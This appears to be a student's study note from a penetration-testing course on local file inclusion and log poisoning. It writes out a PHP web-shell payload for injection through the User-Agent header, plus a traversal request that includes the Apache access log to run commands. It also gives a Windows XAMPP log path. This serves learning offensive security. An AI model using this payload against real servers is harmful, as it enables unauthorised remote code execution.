LFI is including files as part of an app's running code
not to be confused with Directory Traversal-- DT == *displaying* files, LFI == *executing* files

log poisoning: include executable code in log files

 In an LFI vulnerability scenario, the local file we include is executed if it contains executable content. This means that if we manage to write executable code to a file and include it within the running code, it will be executed.

insert `<?php echo system($_GET['cmd']); ?>` in user agent, then use directory traversal to pull up access.log and execute code
GET url.com/page.php?../../../../../../../../../../../var/log/httpd/access.log&cmd=ps
use %20 to fill any spaces

[[Bash reverse shell]]

When we use Log Poisoning on Windows, we should understand that the log files are located in application-specific paths. For example, on a target running _XAMPP_,[10](https://portal.offsec.com/courses/pen-200-44065/learning/common-web-application-attacks-44643/file-inclusion-vulnerabilities-44691/local-file-inclusion-lfi-44645#fn-local_id_457-10) the Apache logs can be found in **`C:\xampp\apache\logs\`**.
